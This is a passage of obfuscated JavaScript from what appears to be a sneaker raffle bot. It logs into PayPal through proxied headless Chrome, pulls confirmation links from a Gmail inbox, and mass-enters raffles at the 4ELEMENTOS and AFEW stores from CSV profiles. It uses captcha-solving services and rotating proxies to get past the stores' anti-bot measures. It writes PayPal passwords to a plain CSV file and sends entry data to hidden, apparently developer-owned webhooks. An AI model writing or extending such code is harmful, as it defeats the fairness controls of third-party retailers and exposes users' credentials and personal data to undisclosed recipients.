        return _0x3c0bbb['Password'] = _0x2cfa90['Password'], _0x39c9ee['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x3c0bbb['Email'] + ',' + _0x3c0bbb['Password'] + ',' + _0x3c0bbb['Proxy']), _0x3c0bbb;
    }
    let _0x525296 = await _0x193e77();
    var _0x42102e = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0xbca1cb = await _0x67cf96['get']('Amount'), _0xddecf = _0xbca1cb['Amount'];
    async function _0x1eae90() {
        let _0x3474f9 = 0x0;
        var _0x4619ce = new _0x51510b({
            'user': _0x409619['masterMail'],
            'password': _0x409619['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x28c925(_0x58ecf5) {
            _0x4619ce['openBox']('INBOX', ![], _0x58ecf5);
        }
        _0x4619ce['once']('ready', function () {
            _0x28c925(function (_0x349e9e, _0x5e10b3) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x349e9e)
                    throw _0x349e9e;
                _0x4619ce['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x46d905, _0xc3b539) {
                    if (!_0xc3b539 || !_0xc3b539['length'])
                        console['log'](_0x3996da() + '\x20[' + _0x20bedd + ']\x20No\x20mails\x20found'), _0x4619ce['end']();
                    else {
                        _0xc3b539 = _0xc3b539['slice'](0x0, _0xddecf);
                        var _0x2f3faf = _0x4619ce['seq']['fetch'](_0xc3b539, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x2f3faf['on']('message', function (_0x2ab0e2, _0x3280bd) {
                            var _0x565d67 = '(#' + _0x3280bd + ')\x20';
                            _0x2ab0e2['on']('body', function (_0x200413, _0x1b9be5) {
                                _0x3f1b1e(_0x200413, (_0x592bc2, _0x4ee164) => {
                                    if (_0x4ee164['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x4ee164['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x4ee164['text']['split']('[')[0x2];
                                        var _0x2d68a1 = mes['split'](']')[0x0];
                                        _0x42102e['push'](_0x2d68a1);
                                    }
                                });
                            }), _0x2ab0e2['once']('end', function () {
                                _0x3474f9++;
                            });
                        }), _0x2f3faf['once']('error', function (_0x33d90f) {
                            console['log']('Fetch\x20error:\x20' + _0x33d90f);
                        }), _0x2f3faf['once']('end', function () {
                            _0x4619ce['end']();
                        });
                    }
                });
            });
        }), _0x4619ce['once']('error', function (_0x6e572e) {
            console['log'](_0x3c5615['red'](_0x6e572e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x4619ce['once']('end', async function () {
        }), _0x4619ce['connect']();
    }
    try {
        _0x1eae90(), await _0x50b4f8(0xfa0), console['log']('Found\x20' + _0x42102e['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x50b4f8(0xfa0);
    }
    var _0x4be680;
    _0x5b3b18('' + _0x20bedd);
    var _0x5e2460 = _0x525296['Proxy']['split'](':'), _0x17b6a2;
    try {
        _0x17b6a2 = await _0x27947['launch']({
            'userDataDir': 'sessions/' + _0x525296['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5e2460[0x0] + ':' + _0x5e2460[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x17b6a2 = await _0x27947['launch']({
            'userDataDir': 'sessions/' + _0x525296['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5e2460[0x0] + ':' + _0x5e2460[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x3996da() + '\x20[' + _0x20bedd + ']\x20Getting\x20Session');
        const _0x322741 = await _0x17b6a2['newPage']();
        await _0x322741['authenticate']({
            'username': '' + _0x5e2460[0x2],
            'password': '' + _0x5e2460[0x3]
        }), await _0x322741['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x322741['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x3996da() + '\x20[' + _0x20bedd + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x322741['waitForSelector']('#email');
            let _0x28dbee = await _0x322741['$eval']('#email', _0x21d645 => _0x21d645['getAttribute']('value'));
            if (_0x28dbee == '') {
                await _0x322741['type']('#email', _0x525296['Email']), await _0x50b4f8(0x1d3);
                let _0x15b70e = await _0x322741['$']('#splitPassword');
                _0x15b70e && (await _0x322741['click']('#btnNext'), await _0x50b4f8(0xa28)), await _0x322741['type']('#password', _0x525296['Password']), await _0x50b4f8(0x35c), await _0x322741['click']('#btnLogin');
            } else
                await _0x322741['type']('#password', _0x525296['Password']), await _0x50b4f8(0x35c), await _0x322741['click']('#btnLogin');
            await _0x322741['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x3996da() + '\x20[' + _0x20bedd + ']\x20Successfully\x20logged\x20in'), await _0x50b4f8(0x2710);
        } catch (_0x469418) {
            throw new Error('Login\x20session\x20expired\x20' + _0x469418);
        }
        for (var _0x2bc930 = 0x0; _0x2bc930 < _0x42102e['length']; _0x2bc930++) {
            console['log'](_0x3996da() + '\x20[' + _0x20bedd + ']\x20Task\x20' + (_0x2bc930 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x5b3b18(_0x20bedd + '\x20Task\x20' + (_0x2bc930 + 0x1) + '\x20/\x20' + _0x42102e['length']);
            const _0x1932f0 = await _0x17b6a2['newPage']();
            await _0x1932f0['goto']('' + _0x42102e[_0x2bc930], { 'waitUntil': 'networkidle2' }), await _0x50b4f8(0xbb8);
            try {
                const _0x4dbe2d = await _0x1932f0['$']('#challenge-heading');
                _0x4dbe2d && (console['log'](_0x3996da() + '\x20[' + _0x20bedd + ']\x20Task\x20' + (_0x2bc930 + 0x1) + '\x20:\x20' + _0x3c5615['yellow']('2FA\x20Required')), await _0x1932f0['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x50b4f8(0x9c40), await _0x1932f0['waitForSelector']('#payment-submit-btn'), await _0x1932f0['$eval']('#payment-submit-btn', _0x41bfff => _0x41bfff['click']()), await _0x1932f0['click']('#payment-submit-btn');
                try {
                    await _0x1932f0['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x50b4f8(0x5dc), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x20bedd + ']\x20Task\x20' + (_0x2bc930 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x3d2d99) {
                    _0x20939e = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x3d2d99['message']);
                } finally {
                    if (_0x20939e == 'yes' && _0x426a81 != 0x2) {
                        console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x20bedd['name'] + ']\x20Task\x20' + (_0x2bc930 + 0x1) + '\x20:\x20Retrying\x20(' + _0x426a81 + '\x20/\x205)')), _0x2bc930 = _0x2bc930 - 0x1, _0x426a81 = _0x426a81 + 0x1;
                        continue;
                    }
                    _0x20939e == 'yes' && _0x426a81 >= 0x2 && (_0x61dfa6(csv[_0x2bc930], _0x20bedd), _0x20939e = 'no', _0x426a81 = 0x0), await _0x1932f0['close'](), await _0x50b4f8(0x4650);
                }
            } catch (_0x23e844) {
                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x20bedd + ']\x20Task\x20' + (_0x2bc930 + 0x1) + '\x20:\x20' + _0x23e844));
            }
        }
    } catch (_0x1a32b9) {
        console['log'](_0x3c5615['red']('' + _0x1a32b9));
    } finally {
        await _0x17b6a2['close']();
    }
}
const _0x3d434d = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x3e0f01, _0x50f1f4, _0x2fd504) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5dad0b = 0x0; _0x5dad0b < _0x50f1f4['length']; _0x5dad0b++) {
                        if (_0x21f2af != 'yes')
                            var _0x21f2af = '', _0x4a9a1c = 0x0;
                        var _0x3b9bb7;
                        try {
                            await _0x5a027c(_0x50f1f4, _0x5dad0b);
                        } catch {
                            _0x21f2af = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5b3b18(_0x3e0f01['name'] + '\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20/\x20' + _0x50f1f4['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        var _0x406ca5 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x4127f6 = Math['round'](Math['random']() * (_0x406ca5['length'] - 0x1));
                        _0x50f1f4[_0x5dad0b]['Size'] == 'RANDOM' && (_0x50f1f4[_0x5dad0b]['Size'] = _0x406ca5[_0x4127f6]);
                        var _0xac359 = Math['round'](Math['random']() * (_0x2fd504['length'] - 0x1)), _0x462ce0 = _0x2fd504[_0xac359]['split'](':'), _0x41c51f;
                        try {
                            _0x41c51f = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x462ce0[0x0] + ':' + _0x462ce0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x41c51f = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x462ce0[0x0] + ':' + _0x462ce0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x54694b = await _0x41c51f['newPage']();
                            await _0x54694b['authenticate']({
                                'username': '' + _0x462ce0[0x2],
                                'password': '' + _0x462ce0[0x3]
                            }), await _0x54694b['setRequestInterception'](!![]), _0x54694b['on']('request', _0x370e60 => {
                                _0x370e60['resourceType']() === 'image' || _0x370e60['resourceType']() === 'font' || _0x370e60['resourceType']() === 'media' ? _0x370e60['abort']() : _0x370e60['continue']();
                            }), await _0x54694b['goto'](_0x50f1f4[_0x5dad0b]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x54694b['waitForSelector']('#accept-all-gdpr'), await _0x54694b['click']('#accept-all-gdpr'), await _0x54694b['waitForSelector']('#raffles-product'), await _0x50b4f8(0x3e8), await _0x54694b['$eval']('#raffles-product', _0x36665f => _0x36665f['click']()), await _0x50b4f8(0x1388), await _0x54694b['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x2570b8 = await _0x54694b['$']('.fancybox-inner\x20>\x20iframe'), _0x3a0cb7 = await _0x2570b8['contentFrame']();
                            console['log'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20:\x20Checking\x20Information'), await _0x3a0cb7['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x50b4f8(0x1f4), await _0x3a0cb7['type']('input[name=\x22sm-form-email\x22]', _0x50f1f4[_0x5dad0b]['Email']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-form-name\x22]', _0x50f1f4[_0x5dad0b]['FirstName'] + '\x20' + _0x50f1f4[_0x5dad0b]['LastName']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-form-street\x22]', _0x50f1f4[_0x5dad0b]['Address1'] + '\x20' + _0x50f1f4[_0x5dad0b]['HouseNumber'] + '\x20' + _0x50f1f4[_0x5dad0b]['Address2']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-form-city\x22]', _0x50f1f4[_0x5dad0b]['City']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-form-province\x22]', _0x50f1f4[_0x5dad0b]['State']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-form-zip\x22]', _0x50f1f4[_0x5dad0b]['Zip']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-form-country\x22]', _0x50f1f4[_0x5dad0b]['Country']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-form-phone\x22]', _0x50f1f4[_0x5dad0b]['Phone']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x50f1f4[_0x5dad0b]['Follower']), await _0x50b4f8(0xc8), await _0x3a0cb7['type']('input[name=\x22sm-cst.size\x22]', _0x50f1f4[_0x5dad0b]['Size']), await _0x50b4f8(0x1f4), await _0x3a0cb7['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x50b4f8(0x1f4), await _0x3a0cb7['click']('.icheckbox_simple-custom'), await _0x50b4f8(0x1f4), console['log'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x3a0cb7['$eval']('form', _0x124506 => _0x124506['submit']()), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x21f2af = '';
                            var _0x3dad93 = await _0x4808d0(_0x50f1f4[_0x5dad0b], _0x3e0f01, 'dev', ![]), _0x348173 = await _0x4808d0(_0x50f1f4[_0x5dad0b], _0x3e0f01, 'pub', ![]);
                            const _0x17cfe8 = {
                                'succesDEVMSG': { 'embeds': [_0x3dad93] },
                                'succesPUBMSG': { 'embeds': [_0x348173] }
                            };
                            try {
                                _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x17cfe8['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x17cfe8['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x171aec, _0x17cfe8['succesPUBMSG']);
                            } catch (_0x11e164) {
                                console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x11e164));
                            }
                        } catch (_0x233f2f) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20:\x20' + _0x233f2f)), _0x3b9bb7 = '' + _0x233f2f;
                            var _0xec1c5c = await _0x4808d0(_0x50f1f4[_0x5dad0b], _0x3e0f01, 'dev', !![], _0x3b9bb7), _0x3dad93 = await _0x4808d0(_0x50f1f4[_0x5dad0b], _0x3e0f01, 'dev', ![]), _0x348173 = await _0x4808d0(_0x50f1f4[_0x5dad0b], _0x3e0f01, 'pub', ![]);
                            const _0x4ac760 = {
                                'succesDEVMSG': { 'embeds': [_0x3dad93] },
                                'succesPUBMSG': { 'embeds': [_0x348173] }
                            };
                            _0x4ac760['errorDEV'] = { 'embeds': [_0xec1c5c] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x4ac760['errorDEV']), await _0x21ec0c(_0x451f96, _0x4ac760['errorDEV']), _0x233f2f != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x21f2af = 'yes');
                        } finally {
                            _0x41c51f['close']();
                            if (_0x21f2af == 'yes' && _0x4a9a1c != 0x5 && _0x3b9bb7 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Task\x20' + (_0x5dad0b + 0x1) + '\x20:\x20Retrying\x20(' + _0x4a9a1c + '\x20/\x205)\x20')), _0x5dad0b = _0x5dad0b - 0x1, _0x4a9a1c = _0x4a9a1c + 0x1;
                                continue;
                            }
                            _0x21f2af == 'yes' && _0x4a9a1c >= 0x5 && (_0x61dfa6(_0x50f1f4[_0x5dad0b], _0x3e0f01), _0x21f2af = 'no', _0x4a9a1c = 0x0), console['log'](_0x3996da() + '\x20[' + _0x3e0f01['name'] + ']\x20Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x6eb025, _0x1aa01b) {
                    var _0x3bb3d9 = [];
                    async function _0x19256b() {
                        var _0x3064a2 = new _0x51510b({
                            'user': _0x409619['masterMail'],
                            'password': _0x409619['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xa10a7e(_0x87bae9) {
                            _0x3064a2['openBox']('INBOX', ![], _0x87bae9);
                        }
                        _0x3064a2['once']('ready', function () {
                            _0xa10a7e(function (_0x19aba6, _0x2cdb7b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x19aba6)
                                    throw _0x19aba6;
                                _0x3064a2['seq']['search'](['UNSEEN'], function (_0x5bb31f, _0x2e040d) {
                                    if (!_0x2e040d || !_0x2e040d['length'])
                                        console['log'](_0x3996da() + '\x20[' + _0x6eb025['name'] + ']\x20No\x20mails\x20found'), _0x3064a2['end']();
                                    else {
                                        var _0x3c24b9 = _0x3064a2['seq']['fetch'](_0x2e040d, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3c24b9['on']('message', function (_0x4ba639, _0x2642de) {
                                            var _0x5e8700 = '(#' + _0x2642de + ')\x20';
                                            _0x4ba639['on']('body', function (_0x1dded6, _0x386506) {
                                                _0x3f1b1e(_0x1dded6, (_0x4944f8, _0x4e0c90) => {
                                                    if (_0x4e0c90['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x462903 = _0x4e0c90['html']['split']('\x0a');
                                                        for (var _0x60b56f = 0x0; _0x60b56f < _0x462903['length']; _0x60b56f++) {
                                                            if (_0x462903[_0x60b56f]['includes']('salesmanago') && _0x462903[_0x60b56f]['includes']('<td') && _0x462903[_0x60b56f]['includes']('href')) {
                                                                var _0x2d7e9e = _0x462903[_0x60b56f]['split']('href=\x22'), _0x57199d = _0x2d7e9e[0x1]['split']('\x22')[0x0];
                                                                _0x3bb3d9['push'](_0x57199d);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x4ba639['once']('end', function () {
                                            });
                                        }), _0x3c24b9['once']('error', function (_0x4779a3) {
                                            console['log']('Fetch\x20error:\x20' + _0x4779a3);
                                        }), _0x3c24b9['once']('end', function () {
                                            _0x3064a2['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3064a2['once']('error', function (_0x2ae357) {
                            console['log'](_0x3c5615['red'](_0x2ae357['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x3064a2['once']('end', async function () {
                        }), _0x3064a2['connect']();
                    }
                    async function _0xa46567(_0x125d68, _0x59e3da, _0x2072e5) {
                        for (var _0x4f7f4c = 0x0; _0x4f7f4c < _0x59e3da['length']; _0x4f7f4c++) {
                            async function _0x4fcd6a(_0x362a12, _0x3f92d3, _0x2e5a35, _0x450754, _0x1ac87b) {
                                var _0x5dc4c3, _0x2b565a = {}, _0x33bbb4 = [], _0x43ea09 = {}, _0x583e65 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x14fa9a = Math['round'](Math['random']() * (_0x583e65['length'] - 0x1));
                                _0x450754[_0x362a12]['Size'] == 'RANDOM' && (_0x450754[_0x362a12]['Size'] = _0x583e65[_0x14fa9a]);
                                !_0x450754 && (_0x450754 = {});
                                if (_0x409619['useRandomProxy'] = ![])
                                    var _0x4f366e = _0x1ac87b[_0x362a12]['split'](':');
                                else
                                    var _0xe4d51b = Math['round'](Math['random']() * (_0x1ac87b['length'] - 0x1)), _0x4f366e = _0x1ac87b[_0xe4d51b]['split'](':');
                                var _0x35da60 = {
                                    'jar': _0x5037e5,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2e5a35['url'],
                                    'headers': _0x2e5a35['headers'],
                                    'body': JSON['stringify'](_0x2b565a),
                                    'proxy': 'http://' + _0x4f366e[0x2] + ':' + _0x4f366e[0x3] + '@' + _0x4f366e[0x0] + ':' + _0x4f366e[0x1]
                                };
                                return _0x3f92d3 != 'ver' && (_0x35da60['url'] = _0x2e5a35['url'], _0x35da60['headers'] = _0x2e5a35['headers']), _0x3f92d3 == 'ver' && (_0x35da60['method'] = 'GET', _0x35da60['url'] = _0x450754[_0x362a12]), new Promise(function (_0x313f67, _0xe9eab0) {
                                    callback = async (_0x5acaec, _0xad00fb, _0xeed1da) => {
                                        if (!_0x5acaec && _0xad00fb['statusCode'] == 0xca || !_0x5acaec && _0xad00fb['statusCode'] == 0xc8) {
                                            if (_0x3f92d3 != 'ver') {
                                                var _0x6c636e = await _0x4808d0(_0x450754[_0x362a12], _0x2e5a35, 'dev', ![]), _0x181195 = await _0x4808d0(_0x450754[_0x362a12], _0x2e5a35, 'pub', ![]);
                                                const _0x49cbba = {
                                                    'succesDEVMSG': { 'embeds': [_0x6c636e] },
                                                    'succesPUBMSG': { 'embeds': [_0x181195] }
                                                };
                                                if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                                                    try {
                                                        await _0x21ec0c(_0x409619['webhook'], _0x49cbba['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x49cbba['succesDEVMSG']), await _0x50b4f8(0xc8);
                                                try {
                                                    await _0x21ec0c(_0x171aec, _0x49cbba['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1474be(_0x450754[_0x362a12], _0x2e5a35);
                                            }
                                            _0x313f67(console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x2e5a35['name'] + ']\x20Task\x20' + (_0x362a12 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3f92d3 != 'ver') {
                                                var _0x58da67 = '' + _0x5acaec, _0x11694d = await _0x4808d0(_0x450754[_0x362a12], _0x2e5a35, 'dev', !![], _0x58da67), _0x1137ff = {};
                                                _0x1137ff['errorDEV'] = { 'embeds': [_0x11694d] }, _0x61dfa6(_0x450754[_0x362a12], _0x2e5a35), _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x1137ff['errorDEV']), await _0x21ec0c(_0x451f96, _0x1137ff['errorDEV']);
                                            }
                                            _0xe9eab0(console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x2e5a35['name'] + ']\x20Task\x20' + (_0x362a12 + 0x1) + ':\x20' + _0x5acaec)));
                                        }
                                    };
                                    try {
                                        _0x3f92d3 != 'ver' ? console['log'](_0x3996da() + '\x20[' + _0x2e5a35['name'] + ']\x20Task\x20' + (_0x362a12 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2b565a['data']['attributes']['email']) : console['log'](_0x3996da() + '\x20[' + _0x2e5a35['name'] + ']\x20Task\x20' + (_0x362a12 + 0x1) + ':\x20Fetching\x20Response'), _0x2131de(_0x35da60, callback);
                                    } catch (_0x2e391c) {
                                        console['log'](_0x3996da() + '\x20Task\x20' + (_0x362a12 + 0x1) + ':\x20' + _0x2e391c);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4fcd6a(_0x4f7f4c, 'ver', _0x125d68, _0x59e3da, _0x2072e5), console['log'](_0x3996da() + '\x20[' + _0x125d68['name'] + ']\x20Sleeping\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                            } catch (_0x5e2cc8) {
                            }
                        }
                    }
                    try {
                        _0x19256b(), await _0x50b4f8(0xfa0), console['log']('Found\x20' + _0x3bb3d9['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0xa46567(_0x6eb025, _0x3bb3d9, _0x1aa01b);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x529da2, _0xa58a4b, _0x444cea) {
                for (var _0x12d09d = 0x0; _0x12d09d < _0xa58a4b['length']; _0x12d09d++) {
                    _0x409619['AfewDelay'] = _0x409619['delay'];
                    var _0x53d884;
                    if (_0x544f4d != 'yes')
                        var _0x544f4d = '', _0x34e9b9 = 0x0;
                    var _0x5a262f = _0xa58a4b[_0x12d09d]['Url'], _0x5cadab = _0xa58a4b[_0x12d09d];
                    _0x5b3b18(_0x529da2['name'] + '\x20Task\x20' + (_0x12d09d + 0x1) + '\x20/\x20' + _0xa58a4b['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                    try {
                        await _0x5a027c(_0xa58a4b, _0x12d09d);
                    } catch {
                        _0x544f4d = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x58359e(_0x380fb3) {
                        const _0x334fa5 = _0x39c9ee['readFileSync']('../successful-tasks.csv', 'utf8'), _0x18e793 = _0x54f615['parse'](_0x334fa5, { 'header': !![] })['data'];
                        let _0x34c1bd = ![];
                        for (var _0x2bd60a of _0x18e793) {
                            if (_0x2bd60a['Url'] == _0x380fb3['Url'] && _0x2bd60a['Email'] == _0x380fb3['Email']) {
                                _0x34c1bd = !![];
                                break;
                            }
                        }
                        return _0x34c1bd;
                    }
                    if (await _0x58359e(_0xa58a4b[_0x12d09d]) == !![]) {
                        console['log'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x422e76 = await _0x4808d0(_0xa58a4b[_0x12d09d], _0x529da2, 'dev', ![]), _0x2e2115 = await _0x4808d0(_0xa58a4b[_0x12d09d], _0x529da2, 'pub', ![]);
                    const _0x499d37 = {
                        'succesDEVMSG': { 'embeds': [_0x422e76] },
                        'succesPUBMSG': { 'embeds': [_0x2e2115] }
                    };
                    if (_0xa58a4b[_0x12d09d]['Email'] == '' || _0xa58a4b[_0x12d09d]['FirstName'] == '' || _0xa58a4b[_0x12d09d]['LastName'] == '' || _0xa58a4b[_0x12d09d]['Country'] == '' || _0xa58a4b[_0x12d09d]['Size'] == '' || _0xa58a4b[_0x12d09d]['Address1'] == '' || _0xa58a4b[_0x12d09d]['Zip'] == '') {
                        console['log'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x409619['useRandomProxy'] = ![])
                        var _0x4e53d5 = _0x444cea[_0x12d09d]['split'](':');
                    else
                        var _0x306e63 = Math['round'](Math['random']() * (_0x444cea['length'] - 0x1)), _0x4e53d5 = _0x444cea[_0x306e63]['split'](':');
                    var _0x4019ca;
                    try {
                        _0x4019ca = await _0x27947['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4e53d5[0x0] + ':' + _0x4e53d5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4019ca = await _0x27947['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4e53d5[0x0] + ':' + _0x4e53d5[0x1],
                                '--no-sandbox',
